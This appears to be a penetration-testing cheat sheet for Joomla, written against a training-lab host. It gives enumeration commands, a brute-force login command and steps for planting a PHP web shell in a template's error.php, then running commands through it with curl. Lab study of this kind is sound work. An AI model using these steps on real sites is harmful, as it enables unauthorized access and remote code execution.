# Joomla - Discovery & Enumeration
## Discovery/Footprinting
```
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
```
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```
```
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
```
The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml
```

## Enumeration
https://github.com/SamJoan/droopescan
```
droopescan scan joomla --url http://dev.inlanefreight.local/
```

https://github.com/drego85/JoomlaScan
```
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

# Attacking Joomla
## Brute force the login
https://github.com/ajnik/joomla-bruteforce
```
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Abusing Built-In Functionality
Using the credentials that we obtained, we can log in to the target backend at http://dev.inlanefreight.local/administrator.
1. Click on Templates on the bottom left under Configuration 
2. Choose protostar under the Template column header. This will bring us to the Templates: Customize page 
3. Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows: `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
4. Save & Close at the top and confirm code execution using cURL
```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

## Leveraging Known Vulnerabilities
`Joomla 3.9.4`
https://www.exploit-db.com/exploits/46710